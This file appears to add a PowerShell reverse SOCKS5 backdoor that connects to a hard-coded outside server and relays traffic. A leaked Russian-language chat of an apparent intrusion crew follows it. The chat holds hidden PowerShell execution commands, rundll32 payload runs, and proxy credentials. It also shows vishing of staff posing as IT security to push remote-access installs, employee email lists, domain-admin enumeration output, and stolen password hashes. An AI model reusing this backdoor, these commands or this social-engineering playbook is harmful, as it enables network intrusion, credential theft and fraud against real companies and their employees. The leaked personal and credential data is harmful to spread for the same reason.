+TryWaitForBuffer($mainTcp, 1, 10);
+$sock.Receive($buf, 1, 0);
+$domainNameLen = $buf[0];
+TryWaitForBuffer($mainTcp, $domainNameLen, 10);
+$sock.Receive($buf, $domainNameLen, 0);
+
+$domainName = [System.Text.Encoding]::UTF8.GetString($buf[0..$domainNameLen]);
+
+Write-Host "Connecting to domain: $($domainName)";
+
+TryWaitForBuffer($mainTcp, 2, 10);
+
+$sock.Receive($buf, 2, 0);
+$bPort = $buf[0..1];
+[System.Array]::Reverse($bPort);
+$port = [BitConverter]::ToUInt16($bPort, 0);
+Write-Host "Connecting to port: $($port)"
+
+
+$destAddress = 0;
+
+ResolveDomain $domainName ([ref]$destAddress);
+
+$connectionStatus = ConnectDestinationIpv4 $port $destAddress ([ref]$targetTcp)
+
+Write-Host "Connection status: $($connectionStatus)";
+if ($connectionStatus -eq $False)
+{
+return -1;
+}
+
+
+$sentStatus = SendResponse $sock $destAddress 4 $port 1
+if ($sentStatus -eq $False) {
+
+return -1;
+}
+}
+}
+else {
+return -1;
+}
+
+
+Write-Host "Goto while";
+
+$targetBuffer = new-object System.Byte[] 4096
+$adminBuffer = new-object System.Byte[] 4096
+while ($True)
+{
+if ($mainTcp.Client.Available -gt 0)
+{
+$count = $mainTcp.Client.Receive($adminBuffer);
+$sent = $targetTcp.Client.Send($adminBuffer, 0, $count, 0);
+}
+if ($targetTcp.Client.Available -gt 0)
+{
+$count = $targetTcp.Client.Receive($targetBuffer);
+$sent = $mainTcp.Client.Send($targetBuffer, 0, $count, 0);
+}
+Start-Sleep -Milliseconds 1
+
+}
+
+}
+}
+
+
+function ConnectDestinationIpv4($port, $ipaddress, [ref]$targetTcp) {
+
+$targetTcp.value = New-Object System.Net.Sockets.TcpClient($ipaddress, $port);
+
+return $targetTcp.value.Connected;
+}
+
+function SendResponse($sock, $destinationAddress, $destinationLen, $destinationPort, $addressType) {
+$answer = new-object System.Byte[] 256
+$responseHeaderSize =4;
+
+$answer[0] = 5;
+$answer[1] = 0;
+$answer[2] = 0;
+$answer[3] = $addressType;
+
+$addressBytes = $destinationAddress.GetAddressBytes();
+
+[System.Array]::Copy($addressBytes, 0, $answer, 4, $destinationLen );
+$offset += 4+$destinationLen;
+
+$portBytes = [BitConverter]::GetBytes($destinationPort);
+[System.Array]::Copy($portBytes, 0, $answer, $offset, 2);
+
+$sent = $sock.Send($answer, $offset + 2, 0);
+if($sent -lt 1){
+return $False;
+}
+return $True;
+}
+
+function ResolveDomain($domainName, [ref]$destAddress) {
+Write-Host "Resolved addresses: $([System.Net.Dns]::GetHostAddresses($domainName)[0])"
+$destAddress.value = [System.Net.Dns]::GetHostAddresses($domainName)[0];
+
+return $True;
+}
+Write-Host "Connecting to $($serverAddress)";
+
+$newSock = New-Object System.Net.Sockets.TcpClient($serverAddress, $serverPort);
+$guidBytes = [System.Convert]::FromBase64String($b64guid);
+$newSock.Client.Send($guidBytes, 16, 0);
+
+HandleClient $newSock.Client $newSock
+
+};
+
+
+
+
+function Connect-SocksServer {
+[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+[CmdletBinding()]
+Param(
+[ValidateNotNullOrEmpty()]
+[String]
+$Server,
+
+[ValidateNotNullOrEmpty()]
+[Int]
+$Port
+)
+PROCESS {
+
+$timeout = 10;
+$tcp = New-Object System.Net.Sockets.TcpClient($Server, $Port)
+$buffer = new-object System.Byte[] 4096
+$guid = [Guid]::Empty;
+
+Write-Output "Connected: $($tcp.Connected)"
+$size = 0;
+$bSize = [BitConverter]::GetBytes($size);
+$sent = $tcp.Client.Send($guid.ToByteArray(), 16, 0);
+$sent = $tcp.Client.Send($bSize, 4, 0);
+
+while ($True) {
+$newClientComing = TryWaitForBuffer $tcp 16 10
+
+if($newClientComing -eq $False)
+{
+continue;
+}
+
+$rec = $tcp.Client.Receive($buffer, 16, 0);
+$b64guid = [System.Convert]::ToBase64String($buffer[0..15])
+
+
+$job = Start-Job -scriptblock $sb -ArgumentList @($b64guid,$Server,$Port)
+
+}
+}
+}
+
+Connect-SocksServer -Server "91.196.70.160" -Port 443
+--------------------
+[2024-06-19 09:30:00] @usernameyy:matrix.bestflowers247.online: Untitled1.ps1
+--------------------
+[2024-06-19 09:30:50] @lapa:matrix.bestflowers247.online: TEAMS_EMAILS_EU.txt
+--------------------
+[2024-06-19 09:30:50] @lapa:matrix.bestflowers247.online: TEAMS_EMAILS.txt
+--------------------
+[2024-06-19 09:30:54] @lapa:matrix.bestflowers247.online: вот еще контакты для тимса
+--------------------
+[2024-06-19 09:31:28] @lapa:matrix.bestflowers247.online: но как проверить статус онлайн хз.. можете расписать?
+--------------------
+[2024-06-19 09:32:15] @mel:artronica.rocks: как у тебя дела?
+--------------------
+[2024-06-19 09:32:17] @mel:artronica.rocks: добавил?
+--------------------
+[2024-06-19 09:32:22] @lincoln:artronica.rocks: да
+--------------------
+[2024-06-19 09:32:27] @lincoln:artronica.rocks: все сделано
+--------------------
+[2024-06-19 09:32:31] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 09:32:33] @mel:artronica.rocks: отлично
+--------------------
+[2024-06-19 09:32:38] @mel:artronica.rocks: через 8 минут старт
+--------------------
+[2024-06-19 09:33:02] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 09:34:57] @usernameyy:matrix.bestflowers247.online: * powershell -WindowStyle Hidden -ExecutionPolicy Bypass Untitled1.ps1
+--------------------
+[2024-06-19 09:35:04] @usernameyy:matrix.bestflowers247.online: * powershell -WindowStyle Hidden -ExecutionPolicy Bypass ./Untitled1.ps1
+--------------------
+[2024-06-19 09:36:31] @usernameyy:matrix.bestflowers247.online: *  powershell -ExecutionPolicy RemoteSigned ./Untitled1.ps1
+--------------------
+[2024-06-19 09:39:22] @usernameyy:matrix.bestflowers247.online: socks5 91.196.70.160 41673
+--------------------
+[2024-06-19 09:39:50] @usernameyy:matrix.bestflowers247.online: socks5 91.196.70.160 39593
+--------------------
+[2024-06-19 09:40:20] @mel:artronica.rocks: поехали
+--------------------
+[2024-06-19 09:44:48] @usernamegg:matrix.bestflowers247.online: socks5 91.196.70.160 39593
+socks5 91.196.70.160 41373
+socks5 91.196.70.160 41673
+--------------------
+[2024-06-19 09:48:06] @usernameyy:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> update5, update4 мои соксы, update1 update2 соксы улан, update3 это форма авторизации. runoutlookupdate.bat cоответственно батник который запустить надо
+
+1
+--------------------
+[2024-06-19 09:49:04] @usernamegg:matrix.bestflowers247.online: > <@muaddib6:matrix.org> Занимаюсь
+
+когда будет ?
+--------------------
+[2024-06-19 09:49:24] @muaddib6:matrix.org: В течении часа
+--------------------
+[2024-06-19 09:49:25] @usernamegg:matrix.bestflowers247.online: http://91.196.70.160:81
+--------------------
+[2024-06-19 09:52:43] @usernamegg:matrix.bestflowers247.online: а где тебя мои ребята нашли ?
+--------------------
+[2024-06-19 09:52:55] @lincoln:artronica.rocks: exploit
+--------------------
+[2024-06-19 09:53:38] @lincoln:artronica.rocks: делаю сейчас
+--------------------
+[2024-06-19 09:53:44] @usernamegg:matrix.bestflowers247.online: 94.103.90.9:38538:ismyVT1t:fXbS5C5a
+--------------------
+[2024-06-19 09:53:53] @lincoln:artronica.rocks: очень заточены )
+--------------------
+[2024-06-19 09:53:57] @lincoln:artronica.rocks: русский спам идет
+--------------------
+[2024-06-19 09:54:11] @lincoln:artronica.rocks: уже третий срывается на закачке team viewer
+--------------------
+[2024-06-19 09:54:20] @mel:artronica.rocks: f xnj c fybltcr&
+--------------------
+[2024-06-19 09:54:26] @mel:artronica.rocks: а что с анидеск?
+--------------------
+[2024-06-19 09:54:29] @mel:artronica.rocks: почем тивьюер?
+--------------------
+[2024-06-19 09:54:32] @lincoln:artronica.rocks: вообще не дает им
+--------------------
+[2024-06-19 09:54:39] @lincoln:artronica.rocks: он у них заблокирован
+--------------------
+[2024-06-19 09:54:44] @mel:artronica.rocks: https://helpdeskguru-my.sharepoint.com/:u:/g/personal/tylerperry_helpdeskguru_onmicrosoft_com/EaVgyVPkRH1LmJRlJnDdmhwBO2doj2VaTjZKBaJ6oGojhg?e=qYoC3L
+--------------------
+[2024-06-19 09:54:50] @mel:artronica.rocks: пусть отсюда качают
+--------------------
+[2024-06-19 09:55:09] @mel:artronica.rocks: скажи - это для внутреннего использования
+--------------------
+[2024-06-19 09:55:10] @usernamemm:matrix.bestflowers247.online: ker.txt
+--------------------
+[2024-06-19 09:55:23] @lincoln:artronica.rocks: да я понимаю
+--------------------
+[2024-06-19 09:55:29] @usernamegg:matrix.bestflowers247.online: TEAMS_EMAILS_EU.txt
+--------------------
+[2024-06-19 09:55:34] @usernamegg:matrix.bestflowers247.online: 34d53bf811de63e7a2b0bf86a7462f32-1718787455.zip
+--------------------
+[2024-06-19 09:55:34] @usernamegg:matrix.bestflowers247.online: TEAMS_EMAILS.txt
+--------------------
+[2024-06-19 09:55:35] @usernamegg:matrix.bestflowers247.online: da898393512221b7e5550400ed60cf8d-1718787378.zip
+--------------------
+[2024-06-19 09:55:43] @lincoln:artronica.rocks: я только дозваниваюсь и сразу говорят что им нельзя говорить со мной и сразу спрашивают id
+--------------------
+[2024-06-19 09:55:51] @lincoln:artronica.rocks: сек сейчас найду жертву
+--------------------
+[2024-06-19 09:55:56] @usernamegg:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> но как проверить статус онлайн хз.. можете расписать?
+
+это сокс
+--------------------
+[2024-06-19 09:56:03] @mel:artronica.rocks: это другие или те же которые ты уже присылал?
+--------------------
+[2024-06-19 09:57:01] @mel:artronica.rocks: heiko.nagorski@bucherhydraulics.com с этим закончили?
+--------------------
+[2024-06-19 09:59:36] @lincoln:artronica.rocks: remote accesss
+--------------------
+[2024-06-19 09:59:47] @lincoln:artronica.rocks: не подойдет ?
+--------------------
+[2024-06-19 10:00:04] @mel:artronica.rocks: нужен анидеск или тививер
+--------------------
+[2024-06-19 10:00:14] @mel:artronica.rocks: * нужен анидеск или тимвивер
+--------------------
+[2024-06-19 10:01:57] @lincoln:artronica.rocks: готовить след надо
+--------------------
+[2024-06-19 10:02:02] @lincoln:artronica.rocks: очень быстро отреагировали
+--------------------
+[2024-06-19 10:02:07] @lincoln:artronica.rocks: причем все
+--------------------
+[2024-06-19 10:02:15] @mel:artronica.rocks: не понял
+--------------------
+[2024-06-19 10:02:18] @mel:artronica.rocks: в чем проблема?
+--------------------
+[2024-06-19 10:03:23] @lapa:matrix.bestflowers247.online: +
+--------------------
+[2024-06-19 10:03:30] @mel:artronica.rocks: там 48 000 сотрудников в компании
+--------------------
+[2024-06-19 10:03:37] @mel:artronica.rocks: как они отреагировали?
+--------------------
+[2024-06-19 10:04:02] @lincoln:artronica.rocks: отреагировали
+--------------------
+[2024-06-19 10:04:05] @lincoln:artronica.rocks: вот так
+--------------------
+[2024-06-19 10:04:08] @lincoln:artronica.rocks: очень быстро
+--------------------
+[2024-06-19 10:04:17] @mel:artronica.rocks: подробнее можно?
+--------------------
+[2024-06-19 10:05:03] @lincoln:artronica.rocks: сразу как начинаю говорить
+--------------------
+[2024-06-19 10:05:26] @usernamecc:matrix.bestflowers247.online: ---
+--------------------
+[2024-06-19 10:05:29] @lapa:matrix.bestflowers247.online: вам же вин сокс нужен?
+--------------------
+[2024-06-19 10:05:40] @usernamecc:matrix.bestflowers247.online: `usdermpartners.com \\ id:e29b038c-e00c-4c31-a8ff-c380c04a29d0`
+--------------------
+[2024-06-19 10:06:18] @lincoln:artronica.rocks: сразу задают
+--------------------
+[2024-06-19 10:06:26] @lincoln:artronica.rocks: вопрос все
+--------------------
+[2024-06-19 10:06:30] @lincoln:artronica.rocks: 10 звонков
+--------------------
+[2024-06-19 10:06:34] @lincoln:artronica.rocks: и все говорят одно и тоже
+--------------------
+[2024-06-19 10:06:39] @mel:artronica.rocks: какой вопрос
+--------------------
+[2024-06-19 10:06:48] @lincoln:artronica.rocks: имя мое в компании
+--------------------
+[2024-06-19 10:06:52] @mel:artronica.rocks: так
+--------------------
+[2024-06-19 10:06:56] @lincoln:artronica.rocks: очень быстро отреагировали
+--------------------
+[2024-06-19 10:06:58] @lincoln:artronica.rocks: я же говорю
+--------------------
+[2024-06-19 10:07:08] @mel:artronica.rocks: твое имя в компании соответствует специалисту из компании
+--------------------
+[2024-06-19 10:07:08] @lincoln:artronica.rocks: id number моя спрашивают
+--------------------
+[2024-06-19 10:07:25] @lincoln:artronica.rocks: я это понимаю
+--------------------
+[2024-06-19 10:07:28] @mel:artronica.rocks: имя аккаунта
+--------------------
+[2024-06-19 10:07:32] @lincoln:artronica.rocks: не будут они качать ничего
+--------------------
+[2024-06-19 10:07:42] @lincoln:artronica.rocks: ладно давай я прозвоню
+--------------------
+[2024-06-19 10:07:43] @mel:artronica.rocks: ты весь список прошел?
+--------------------
+[2024-06-19 10:07:51] @lincoln:artronica.rocks: я иду мне парочку осталось
+--------------------
+[2024-06-19 10:08:01] @lincoln:artronica.rocks: но прям им айтишники звонят
+--------------------
+[2024-06-19 10:08:13] @lincoln:artronica.rocks: и говорят что говорить
+--------------------
+[2024-06-19 10:08:14] @muaddib6:matrix.org: > <@usernamegg:matrix.bestflowers247.online> когда будет ?
+
+Готово
+--------------------
+[2024-06-19 10:08:31] @muaddib6:matrix.org: 1.7z
+--------------------
+[2024-06-19 10:08:34] @lapa:matrix.bestflowers247.online: какой пасс от архива?
+--------------------
+[2024-06-19 10:08:51] @mel:artronica.rocks: готовдю следующий. давай доделаем этот
+--------------------
+[2024-06-19 10:08:58] @muaddib6:matrix.org: строка:
+--------------------
+[2024-06-19 10:09:00] @muaddib6:matrix.org: jGsyXKpZ8Cr7HY9JcWDnNwtSx3VUA2EaR4gBe6uhmdvbkTQz5P
+--------------------
+[2024-06-19 10:09:03] @mel:artronica.rocks: может найдется челвек которому пофик
+--------------------
+[2024-06-19 10:09:11] @lincoln:artronica.rocks: дак я ищу
+--------------------
+[2024-06-19 10:09:14] @lincoln:artronica.rocks: но прям все !
+--------------------
+[2024-06-19 10:09:17] @lincoln:artronica.rocks: я говорю очень жестко
+--------------------
+[2024-06-19 10:10:42] @usernamegg:matrix.bestflowers247.online: 91.142.73.198:44875:9Cy5Yiyd:8Qk3UJm5
+--------------------
+[2024-06-19 10:11:29] @mel:artronica.rocks: напиши как закончишь
+--------------------
+[2024-06-19 10:11:33] @usernamegg:matrix.bestflowers247.online: > <@usernamemm:matrix.bestflowers247.online> sent a file.
+
+ну как ?
+--------------------
+[2024-06-19 10:12:36] @lincoln:artronica.rocks: закончил
+--------------------
+[2024-06-19 10:12:55] @lincoln:artronica.rocks: все уведомлены
+--------------------
+[2024-06-19 10:12:59] @lincoln:artronica.rocks: прям супер странно
+--------------------
+[2024-06-19 10:13:02] @mel:artronica.rocks: MarlonCissp@pensionconporation.onmicrosoft.com
+
+--------------------
+[2024-06-19 10:13:11] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 10:13:18] @mel:artronica.rocks: aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 10:13:27] @usernamegg:matrix.bestflowers247.online: вот новый сокс выдали
+--------------------
+[2024-06-19 10:13:41] @mel:artronica.rocks: это твоя должность в компании Information Security Assurance Manager
+--------------------
+[2024-06-19 10:13:46] @usernamegg:matrix.bestflowers247.online: приди
+--------------------
+[2024-06-19 10:13:50] @usernamegg:matrix.bestflowers247.online: я объясню что собрать
+--------------------
+[2024-06-19 10:13:52] @mel:artronica.rocks: seth@pensioncorporation.com
+withers@pensioncorporation.com
+ruleva@pensioncorporation.com
+rahman@pensioncorporation.com
+beard@pensioncorporation.com
+griffiths@pensioncorporation.com
+rowton@pensioncorporation.com
+deanp@pensioncorporation.com
+rydzewska@pensioncorporation.com
+deanr@pensioncorporation.com
+danko@pensioncorporation.com
+padolskis@pensioncorporation.com
+dorrian@pensioncorporation.com
+harrap@pensioncorporation.com
+hristov@pensioncorporation.com
+kinloch@pensioncorporation.com
+kakkar@pensioncorporation.com
+adams@pensioncorporation.com
+gilbert@pensioncorporation.com
+zhang@pensioncorporation.com
+dann@pensioncorporation.com
+plant@pensioncorporation.com
+watkins@pensioncorporation.com
+osullivans@pensioncorporation.com
+hennequin@pensioncorporation.com
+kala@pensioncorporation.com
+jobanputra@pensioncorporation.com
+bonnage@pensioncorporation.com
+inward@pensioncorporation.com
+greene@pensioncorporation.com
+whooley@pensioncorporation.com
+mcfee@pensioncorporation.com
+pearce@pensioncorporation.com
+iaconelli@pensioncorporation.com
+
+--------------------
+[2024-06-19 10:13:54] @usernameyy:matrix.bestflowers247.online: ща доел только
+--------------------
+[2024-06-19 10:13:56] @mel:artronica.rocks: _______________
+--------------------
+[2024-06-19 10:14:03] @usernamegg:matrix.bestflowers247.online: ок
+--------------------
+[2024-06-19 10:14:09] @mel:artronica.rocks: Добавляй. я скажу когда старт
+--------------------
+[2024-06-19 10:14:20] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 10:14:30] @lincoln:artronica.rocks: подкосили меня )
+--------------------
+[2024-06-19 10:14:46] @lincoln:artronica.rocks: я сам на верифе был и коровке еще
+--------------------
+[2024-06-19 10:16:05] @usernamegg:matrix.bestflowers247.online: 94.103.90.9:38538:ismyVT1t:fXbS5C5a
+--------------------
+[2024-06-19 10:24:29] @lincoln:artronica.rocks: есть
+--------------------
+[2024-06-19 10:24:46] @usernameyy:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 10:25:31] @mel:artronica.rocks: отлично. через 10 мин начинаем
+--------------------
+[2024-06-19 10:26:33] @lincoln:artronica.rocks: а мы не знакомы ?
+--------------------
+[2024-06-19 10:28:34] @usernamegg:matrix.bestflowers247.online: ```
+Microsoft Windows [Version 10.0.19044.1288]
+(c) Microsoft Corporation. Alle Rechte vorbehalten.
+
+C:\Users\NagorskH>net group "domain controllers" /dom
+The request will be processed at a domain controller for domain bucherhydraulics.com.
+
+Group name     Domain Controllers
+Comment        All domain controllers in the domain
+
+Members
+
+-------------------------------------------------------------------------------
+S1001001$                S1801002$                S3001001$
+S4001001$                S5001002$                S5011001$
+S5101002$                S5201002$                S6001003$
+S9991001$                S9991002$
+The command completed successfully.
+
+
+C:\Users\NagorskH>
+```
+
+
+--------------------
+[2024-06-19 10:28:51] @usernamegg:matrix.bestflowers247.online: 
+```
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+_sys35bh                 a100-bd                  a100-bsi
+a100-bw                  a100-gk                  a100-kh
+a100-lc                  a100-sp                  a300-uc
+a500-ld                  a500-ma                  a500-mj
+Administrator            administrator_rescue     s000-BackupAD
+s000-questBH
+The command completed successfully.
+
+
+C:\Users\NagorskH>
+```
+--------------------
+[2024-06-19 10:32:06] @usernamegg:matrix.bestflowers247.online: 7zG.exe
+--------------------
+[2024-06-19 10:32:08] @usernamegg:matrix.bestflowers247.online: 7z.dll
+--------------------
+[2024-06-19 10:33:33] @usernamegg:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 10:34:13] @usernamegg:matrix.bestflowers247.online: rundll32 update2.dll, MainFunc
+--------------------
+[2024-06-19 10:35:40] @usernameugway:matrix.bestflowers247.online: если что я уже тут.. работаем
+--------------------
+[2024-06-19 10:35:48] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 10:35:51] @usernameugway:matrix.bestflowers247.online: > <@usernameugway:matrix.bestflowers247.online> https://redsiege.com/blog/2024/01/graphstrike-developer/
+
+статья похожа на то что нужно?
+--------------------
+[2024-06-19 10:35:51] @mel:artronica.rocks: погнали
+--------------------
+[2024-06-19 10:35:59] @mel:artronica.rocks: не забудь свою должность
+--------------------
+[2024-06-19 10:36:03] @mel:artronica.rocks: и как тебя зовут
+--------------------
+[2024-06-19 10:36:04] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 10:36:05] @usernamegg:matrix.bestflowers247.online: частично почитал
+--------------------
+[2024-06-19 10:36:17] @lincoln:artronica.rocks: Security Assurance Manager
+--------------------
+[2024-06-19 10:36:19] @lincoln:artronica.rocks: Marlon )
+--------------------
+[2024-06-19 10:36:49] @mel:artronica.rocks: цель - нужно хотя бы 3 аника поставить с этого списка. в идеале 5
+--------------------
+[2024-06-19 10:36:59] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 10:37:53] @usernamegg:matrix.bestflowers247.online: https://pandorahvnc.sellpass.io
+--------------------
+[2024-06-19 10:38:32] @usernamegg:matrix.bestflowers247.online: 91.142.73.198:34331:9Cy5Yiyd:8Qk3UJm5
+--------------------
+[2024-06-19 10:40:59] @lincoln:artronica.rocks: скрипт кидаю
+--------------------
+[2024-06-19 10:42:17] @lincoln:artronica.rocks: не может
+--------------------
+[2024-06-19 10:42:27] @lincoln:artronica.rocks: блок стоит и на anydesk и на тимку
+--------------------
+[2024-06-19 10:42:30] @lincoln:artronica.rocks: сейчас дальше иду
+--------------------
+[2024-06-19 10:42:59] @lincoln:artronica.rocks: проблема в этой тупой строке
+--------------------
+[2024-06-19 10:43:09] @lincoln:artronica.rocks: что у нас имейл отличается и я не в компании
+--------------------
+[2024-06-19 10:43:13] @lincoln:artronica.rocks: стопорит все
+--------------------
+[2024-06-19 10:43:15] @lincoln:artronica.rocks: сек дальше иду
+--------------------
+[2024-06-19 10:46:35] @mel:artronica.rocks: там где блок стоит на анидеск, отправляй вот эту ссылку
+--------------------
+[2024-06-19 10:46:37] @mel:artronica.rocks: https://helpdeskguru-my.sharepoint.com/:u:/g/personal/tylerperry_helpdeskguru_onmicrosoft_com/EaVgyVPkRH1LmJRlJnDdmhwBO2doj2VaTjZKBaJ6oGojhg?e=qYoC3L
+--------------------
+[2024-06-19 10:46:58] @lincoln:artronica.rocks: $env:LEVEL_API_KEY = "RuifWW5A8gatcB2Kyq7L64W2"; Set-ExecutionPolicy RemoteSigned -Scope Process -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $tempFile = Join-Path ([System.IO.Path]::GetTempPath()) "install_windows.exe"; Invoke-WebRequest -Uri "https://downloads.level.io/install_windows.exe" -OutFile $tempFile; & $tempFile;
+--------------------
+[2024-06-19 10:47:14] @lincoln:artronica.rocks: вот тут просит username and password
+--------------------
+[2024-06-19 10:47:19] @lincoln:artronica.rocks: а у них нет инфы
+--------------------
+[2024-06-19 10:47:25] @mel:artronica.rocks: все правильно
+--------------------
+[2024-06-19 10:47:33] @mel:artronica.rocks: свой пусть введут
+--------------------
+[2024-06-19 10:47:35] @mel:artronica.rocks: от компа
+--------------------
+[2024-06-19 10:47:41] @mel:artronica.rocks: логин и пароль
+--------------------
+[2024-06-19 10:51:20] @lincoln:artronica.rocks: нет
+--------------------
+[2024-06-19 10:51:21] @lincoln:artronica.rocks: не подходит
+--------------------
+[2024-06-19 10:51:23] @lincoln:artronica.rocks: https://prnt.sc/RTm6L2FUCPbY
+--------------------
+[2024-06-19 10:51:28] @lincoln:artronica.rocks: линк твой не работает
+--------------------
+[2024-06-19 10:51:31] @lincoln:artronica.rocks: какие еще варианты
+--------------------
+[2024-06-19 10:52:01] @mel:artronica.rocks: прощаемся и дальше
+--------------------
+[2024-06-19 10:52:04] @lincoln:artronica.rocks: сейчас попробую еще
+--------------------
+[2024-06-19 10:52:08] @lincoln:artronica.rocks: через 30 минут
+--------------------
+[2024-06-19 10:52:20] @mel:artronica.rocks: что через 30 минут?
+--------------------
+[2024-06-19 10:52:23] @ugw:artronica.rocks: я тесанул только что линк работает
+--------------------
+[2024-06-19 10:52:26] @ugw:artronica.rocks: если что
+--------------------
+[2024-06-19 10:52:39] @ugw:artronica.rocks: можно в чат ему кинуть exe от эника
+--------------------
+[2024-06-19 10:53:13] @lincoln:artronica.rocks: я кидал
+--------------------
+[2024-06-19 10:53:21] @lincoln:artronica.rocks: ссылку
+--------------------
+[2024-06-19 10:53:36] @mel:artronica.rocks: ты с ними еще на связи?
+--------------------
+[2024-06-19 10:54:02] @lincoln:artronica.rocks: у нее звонок через 5 минут
+--------------------
+[2024-06-19 10:54:06] @burito:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> Han: burrito у вас есть крипт который в другой процесс инжектится, чтобы файл не занимать?
+
+Можно через инжект в другой процесс, но надо учесть, что для всех проактивок это палево
+--------------------
+[2024-06-19 10:54:07] @lincoln:artronica.rocks: я с ней договорился через 30
+--------------------
+[2024-06-19 10:54:11] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 10:54:19] @lincoln:artronica.rocks: она готова работать
+--------------------
+[2024-06-19 10:54:23] @mel:artronica.rocks: скачай себе анидеск
+--------------------
+[2024-06-19 10:54:27] @lincoln:artronica.rocks: какие еще варианты есть
+--------------------
+[2024-06-19 10:54:34] @mel:artronica.rocks: и установочный файл попробуй ей отправить через чат
+--------------------
+[2024-06-19 10:54:37] @mel:artronica.rocks: при разговоре
+--------------------
+[2024-06-19 10:54:48] @mel:artronica.rocks: давай дальше звонить
+--------------------
+[2024-06-19 10:54:56] @lincoln:artronica.rocks: он не дает
+--------------------
+[2024-06-19 10:55:02] @lincoln:artronica.rocks: я пытался так сделать при разговоре
+--------------------
+[2024-06-19 10:55:47] @lincoln:artronica.rocks: она в офисе будет через 2 часа
+--------------------
+[2024-06-19 10:55:59] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 10:56:01] @mel:artronica.rocks: поехали дальше
+--------------------
+[2024-06-19 10:56:07] @usernamegg:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 10:56:08] @usernamegg:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 10:56:19] @usernamegg:matrix.bestflowers247.online: новый пас
+--------------------
+[2024-06-19 10:56:30] @usernamegg:matrix.bestflowers247.online: подлей на все впски его
+--------------------
+[2024-06-19 10:56:40] @mel:artronica.rocks: принял
+--------------------
+[2024-06-19 10:56:42] @mel:artronica.rocks: делаю
+--------------------
+[2024-06-19 10:56:45] @usernamegg:matrix.bestflowers247.online: * новый пак
+--------------------
+[2024-06-19 10:56:48] @mel:artronica.rocks: ты на той закончил?
+--------------------
+[2024-06-19 10:56:57] @usernamegg:matrix.bestflowers247.online: теперь все без батника
+--------------------
+[2024-06-19 10:57:15] @usernamegg:matrix.bestflowers247.online: нет
+--------------------
+[2024-06-19 10:57:16] @usernamegg:matrix.bestflowers247.online: не закончил
+--------------------
+[2024-06-19 10:57:31] @usernameyy:matrix.bestflowers247.online: ага,  я на всякий случай
+--------------------
+[2024-06-19 10:57:39] @mel:artronica.rocks: ок. напиши как закончишь. туда тоже залью
+--------------------
+[2024-06-19 10:58:16] @burito:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> ага,  я на всякий случай
+
+Да, как надо будет, скажешь, что с инжектом в другой процесс
+--------------------
+[2024-06-19 10:59:08] @lincoln:artronica.rocks: продумайте план под Keli Zhang
+--------------------
+[2024-06-19 10:59:17] @lincoln:artronica.rocks: она как раз дома и будет звонок через 20 минут
+--------------------
+[2024-06-19 11:01:07] @lincoln:artronica.rocks: те которые в офисе
+--------------------
+[2024-06-19 11:01:17] @lincoln:artronica.rocks: с ними сложно и они сразу передают информацию
+--------------------
+[2024-06-19 11:01:23] @lincoln:artronica.rocks: и сидят тупо задают вопросы
+--------------------
+[2024-06-19 11:01:42] @lincoln:artronica.rocks: у нас есть готовый контакт
+--------------------
+[2024-06-19 11:01:47] @lincoln:artronica.rocks: Keli Zhang
+--------------------
+[2024-06-19 11:01:57] @lincoln:artronica.rocks: я дальше звоню
+--------------------
+[2024-06-19 11:03:29] @mel:artronica.rocks: напоминаю - нам нужны установки anydesk
+--------------------
+[2024-06-19 11:03:34] @lincoln:artronica.rocks: я понимаю
+--------------------
+[2024-06-19 11:03:48] @lincoln:artronica.rocks: я обзваниваю всех
+--------------------
+[2024-06-19 11:03:57] @lincoln:artronica.rocks: Anydesk заблокирован
+--------------------
+[2024-06-19 11:04:05] @lincoln:artronica.rocks: и ссылку что ты дал заблокирована
+--------------------
+[2024-06-19 11:04:10] @lincoln:artronica.rocks: в чате я передать не могу
+--------------------
+[2024-06-19 11:04:16] @lapa:matrix.bestflowers247.online: > <@lapa:matrix.bestflowers247.online> какой пасс от архива?
+
+??
+--------------------
+[2024-06-19 11:04:16] @mel:artronica.rocks: это точно не у всех
+--------------------
+[2024-06-19 11:04:19] @lincoln:artronica.rocks: через powershell
+--------------------
+[2024-06-19 11:04:30] @lincoln:artronica.rocks: не может зайти
+--------------------
+[2024-06-19 11:04:39] @lincoln:artronica.rocks: даже когда свой user id вбивает
+--------------------
+[2024-06-19 11:04:45] @lincoln:artronica.rocks: я дальше обзваниваю
+--------------------
+[2024-06-19 11:04:51] @mel:artronica.rocks: ок
+--------------------
+[2024-06-19 11:09:20] @usernamegg:matrix.bestflowers247.online: 91.142.73.198:34331:9Cy5Yiyd:8Qk3UJm5
+--------------------
+[2024-06-19 11:09:29] @usernamegg:matrix.bestflowers247.online: ага
+--------------------
+[2024-06-19 11:09:33] @usernamegg:matrix.bestflowers247.online: на другие залил уже ?
+--------------------
+[2024-06-19 11:09:42] @mel:artronica.rocks: на второй да
+--------------------
+[2024-06-19 11:10:03] @mel:artronica.rocks: и угу отправил тоже
+--------------------
+[2024-06-19 11:12:37] @usernamemm:matrix.bestflowers247.online: `BUCHERHYDRAULICS.COM/a100-lc:8311bcd89cb34f5b7cdc1afae487a285`
+--------------------
+[2024-06-19 11:12:46] @usernamemm:matrix.bestflowers247.online: `BUCHERHYDRAULICS.COM/a100-bw:c79621080356c1164afbf2bd40fbfd1e:a100-bw`
+--------------------
